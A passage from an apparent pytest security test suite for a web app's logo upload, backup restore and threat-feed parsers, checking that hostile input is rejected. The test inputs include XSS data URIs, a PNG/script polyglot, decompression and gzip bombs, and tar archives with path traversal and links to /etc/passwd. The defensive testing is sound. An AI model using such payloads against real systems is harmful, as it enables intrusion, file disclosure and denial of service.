    def chunk(t: bytes, d: bytes) -> bytes:
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    rowlen = (width * bitdepth + 7) // 8
    raw = (b"\x00" + b"\x00" * rowlen) * height
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, bitdepth, color, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw, 9)) + chunk(b"IEND", b""))


@pytest.mark.parametrize("uri", [
    "data:image/svg+xml;base64," + base64.b64encode(b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>').decode(),
    "data:image/png;base64," + base64.b64encode(b'<svg onload="alert(1)"/>').decode(),  # lying MIME
    "data:image/gif;base64," + base64.b64encode(b"GIF89a\x01\x00\x01\x00").decode(),
    "javascript:alert(1)",
    "data:image/png;base64,!!!!",
    "data:image/png;base64," + base64.b64encode(_png() + b"\x00" * (301 * 1024)).decode(),
])
def test_logo_rejects_hostile_or_oversized(H, uri):
    r = H.c.put("/api/orgs/branding", json={"logo_data_uri": uri})
    assert r.status_code == 422, r.text


def test_logo_png_polyglot_is_canonicalised(H):
    payload = _png() + b"<script>alert(1)</script>"
    r = H.c.put("/api/orgs/branding", json={"logo_data_uri": "data:text/html;base64," + base64.b64encode(payload).decode()})
    assert r.status_code == 200
    assert r.json()["branding"]["logo_data_uri"].startswith("data:image/png;base64,")


def test_logo_decompression_bomb_rejected(H):
    bomb = _png(30000, 30000, bitdepth=1, color=0)
    assert len(bomb) < 300 * 1024
    r = H.c.put("/api/orgs/branding", json={"logo_data_uri": "data:image/png;base64," + base64.b64encode(bomb).decode()})
    assert r.status_code == 422


# ===========================================================================
# 8. Backup restore
# ===========================================================================

@pytest.fixture
def restore_sandbox(monkeypatch):
    """Snapshot the (hermetic, conftest-provided) data.db + evidence tree and
    put them back afterwards, so destructive restores cannot leak into other tests.

    restore_from_bytes() disposes the app engine; in the test harness that makes
    later connections open a fresh ./test.db (the harness deletes it per test),
    so neutralise dispose() here — a harness artifact, not app behaviour."""
    import types
    from services import backup as backup_svc
    monkeypatch.setattr(backup_svc, "engine", types.SimpleNamespace(dispose=lambda: None))
    data_db = settings.data_dir / "data.db"
    ev = settings.evidence_dir
    assert "athorize-test-data-" in str(settings.data_dir)  # never a real install
    saved_db = data_db.read_bytes() if data_db.exists() else None
    saved_ev = settings.data_dir / "_hunt_ev_snapshot"
    if saved_ev.exists():
        shutil.rmtree(saved_ev)
    if ev.exists():
        shutil.copytree(ev, saved_ev)
    yield
    if saved_db is not None:
        data_db.write_bytes(saved_db)
    if ev.exists():
        shutil.rmtree(ev)
    if saved_ev.exists():
        shutil.move(str(saved_ev), str(ev))
    else:
        ev.mkdir(parents=True, exist_ok=True)


def _tar(members: list[tuple[tarfile.TarInfo, bytes | None]], manifest: bool = True) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        if manifest:
            m = json.dumps({"version": 1}).encode()
            ti = tarfile.TarInfo("manifest.json")
            ti.size = len(m)
            t.addfile(ti, io.BytesIO(m))
        for ti, data in members:
            t.addfile(ti, io.BytesIO(data) if data is not None else None)
    return buf.getvalue()


def _file(name: str, data: bytes) -> tuple[tarfile.TarInfo, bytes]:
    ti = tarfile.TarInfo(name)
    ti.size = len(data)
    return ti, data


def _link(name: str, target: str, kind=tarfile.SYMTYPE) -> tuple[tarfile.TarInfo, None]:
    ti = tarfile.TarInfo(name)
    ti.type = kind
    ti.linkname = target
    return ti, None


def _restore(H, blob: bytes, passphrase: str = ""):
    nonce = H.c.get("/api/backup/info").json()["restore_nonce"]
    return H.c.post("/api/backup/restore", data={"nonce": nonce, "passphrase": passphrase},
                    files={"file": ("b.tar.gz", io.BytesIO(blob), "application/gzip")})


@pytest.mark.parametrize("member", [
    _file("../escape.txt", b"x"),
    _file("/etc/hunt-abs.txt", b"x"),
    _file("evidence/../../escape.txt", b"x"),
    _file("evidence/1/../../../escape.txt", b"x"),
    _file("random_top_level.txt", b"x"),
    _link("evidence/1/link.pdf", "/etc/passwd"),
    _link("evidence/1/hard.pdf", "/etc/passwd", tarfile.LNKTYPE),
    _link("data.db", "/etc/passwd"),
], ids=["dotdot", "absolute", "evidence-dotdot", "deep-dotdot", "unexpected", "symlink", "hardlink", "db-symlink"])
def test_restore_rejects_slip_and_links(H, restore_sandbox, member):
    before = (settings.data_dir / "data.db").read_bytes()
    r = _restore(H, _tar([member, _file("data.db", b"SQLite format 3\x00")]))
    assert r.status_code == 400, r.text
    assert (settings.data_dir / "data.db").read_bytes() == before
    assert not (settings.data_dir.parent / "escape.txt").exists()


def test_restore_rejects_garbage_and_wrong_manifest(H, restore_sandbox):
    assert _restore(H, b"PK\x03\x04 this is a zip, not a tar.gz").status_code == 400
    assert _restore(H, _tar([], manifest=False)).status_code == 400
    bad_ver = io.BytesIO()
    with tarfile.open(fileobj=bad_ver, mode="w:gz") as t:
        m = b'{"version": 999}'
        ti = tarfile.TarInfo("manifest.json"); ti.size = len(m); t.addfile(ti, io.BytesIO(m))
    assert _restore(H, bad_ver.getvalue()).status_code == 400
    assert _restore(H, b"UNIV1" + b"\x00" * 64, passphrase="wrong").status_code == 400


@pytest.mark.parametrize("kind", ["garbage", "foreign-sqlite"])
def test_restore_validates_database(H, restore_sandbox, tmp_path, kind):
    if kind == "garbage":
        db_bytes = b"this is definitely not a database" * 100
    else:
        p = tmp_path / "foreign.db"
        con = sqlite3.connect(p)
        con.execute("CREATE TABLE notes (id INTEGER, body TEXT)")
        con.commit(); con.close()
        db_bytes = p.read_bytes()
    r = _restore(H, _tar([_file("data.db", db_bytes)]))
    assert r.status_code == 400, r.text


def test_restore_without_db_keeps_live_database(H, restore_sandbox):
    live = settings.data_dir / "data.db"
    assert live.exists()
    r = _restore(H, _tar([_file("evidence/1/x.pdf", b"%PDF")]))
    assert r.status_code == 400 or live.exists(), r.text


def test_restore_gzip_bomb_is_capped(restore_sandbox, monkeypatch):
    from services import backup as backup_svc
    monkeypatch.setattr(backup_svc, "_MAX_RESTORE_EXPANDED_BYTES", 8 * 1024 * 1024, raising=False)
    size = 32 * 1024 * 1024
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", compresslevel=9) as t:
        m = json.dumps({"version": 1}).encode()
        ti = tarfile.TarInfo("manifest.json"); ti.size = len(m); t.addfile(ti, io.BytesIO(m))
        ti = tarfile.TarInfo("evidence/1/zeros.bin"); ti.size = size

        class Zeros(io.RawIOBase):
            left = size

            def readable(self):
                return True

            def readinto(self, b):
                n = min(len(b), self.left)
                b[:n] = b"\x00" * n
                self.left -= n
                return n
        t.addfile(ti, io.BufferedReader(Zeros()))
    blob = buf.getvalue()
    assert len(blob) < 256 * 1024  # ~1000:1
    with pytest.raises(backup_svc.BackupError):
        backup_svc.restore_from_bytes(blob)


def test_backup_includes_custom_frameworks(H):
    r = H.c.post("/api/custom-frameworks", json={"name": "Hunt Internal Policy"})
    assert r.status_code == 200, r.text
    fid = r.json()["id"]
    try:
        H.c.put(f"/api/custom-frameworks/{fid}/controls", json={"controls": [{"id": "IP-1", "title": "Policy"}]})
        dl = H.c.post("/api/backup/download", data={"passphrase": ""})
        assert dl.status_code == 200
        names = tarfile.open(fileobj=io.BytesIO(dl.content), mode="r:gz").getnames()
        assert any(n.startswith("custom_frameworks/") and fid in n for n in names), names
    finally:
        H.c.delete(f"/api/custom-frameworks/{fid}")


# ===========================================================================
# 9. Threat-feed parsers (bundled mocks + hostile CSAF)
# ===========================================================================

def test_bundled_mock_feeds_parse():
    from services.feeds_aa import fetch_aa
    from services.feeds_kev import fetch_kev
    from services.feeds_nvd import fetch_nvd
    from services.feeds_psirt import fetch_psirt
    from services.ics_advisory_mock import mock_advisories
    for fetch in (fetch_aa, fetch_kev, fetch_nvd, fetch_psirt):
        items = fetch(live=False)
        assert items, fetch.__name__
        assert all(i["advisory_id"] and i["title"] and i["severity"] for i in items)
    assert mock_advisories()


MALFORMED_CSAF = [
    ["not", "an", "object"],
    {"document": "string-not-object"},
    {"document": {"title": "t", "tracking": {"id": "X-1"}}, "vulnerabilities": ["str"]},
    {"document": {"title": "t", "tracking": {"id": "X-2"}, "notes": [1]}},
    {"document": {"title": "t", "tracking": {"id": "X-3"}}, "product_tree": {"branches": [None]}},
]


def test_custom_csaf_feed_survives_one_malformed_document(monkeypatch):
    from services import feeds_custom as fc
    good = {"document": {"title": "Acme PLC advisory", "tracking": {"id": "ACME-2026-001",
                                                                    "initial_release_date": "2026-10-01T00:00:00Z"}},
            "vulnerabilities": [{"cve": "DEMO-2026-0001", "scores": [{"cvss_v3": {"baseSeverity": "HIGH", "baseScore": 8.1}}]}]}
    docs = {f"https://csaf.example.com/bad{i}.json": d for i, d in enumerate(MALFORMED_CSAF)}
    docs["https://csaf.example.com/good.json"] = good
    provider = {"distributions": [{"rolie": {"feeds": [{"tlp_label": "WHITE", "url": "https://csaf.example.com/feed.json"}]}}]}
    feed = {"feed": {"entry": [{"updated": f"2026-10-{10 + i:02d}", "link": [{"rel": "self", "href": u}]}
                               for i, u in enumerate(docs)]}}

    def fake_fetch(client, url, host):
        if url.endswith("provider-metadata.json"):
            return provider
        if url.endswith("feed.json"):
            return feed
        return docs[url]

    monkeypatch.setattr(fc, "_fetch_locked_json", fake_fetch)
    monkeypatch.setattr(fc, "assert_public_host", lambda host: None)
    results, errors = fc.fetch_custom_feeds([{"name": "Acme PSIRT", "format": "csaf",
                                              "url": "https://csaf.example.com/.well-known/csaf/provider-metadata.json"}])
    assert [a["advisory_id"] for a, _ in results] == ["ACME-2026-001"]


def test_backup_contains_the_live_database(H, tmp_path):
    # The test app runs with DATABASE_URL=sqlite:///./test.db (conftest), exactly
    # like an operator who points DATABASE_URL somewhere other than DATA_DIR.
    assert settings.database_url
    H.siem("fast.log", fixture_bytes("siem", "fast.log"), confirm=True)
    assert len(H.findings()) == 3
    dl = H.c.post("/api/backup/download", data={"passphrase": ""})
    assert dl.status_code == 200
    tf = tarfile.open(fileobj=io.BytesIO(dl.content), mode="r:gz")
    assert "data.db" in tf.getnames()
    out = tmp_path / "restored.db"
    out.write_bytes(tf.extractfile("data.db").read())
    con = sqlite3.connect(out)
    try:
        n = con.execute("SELECT COUNT(*) FROM findings").fetchone()[0]
    except sqlite3.OperationalError:
        n = None
    finally:
        con.close()
    assert n == 3
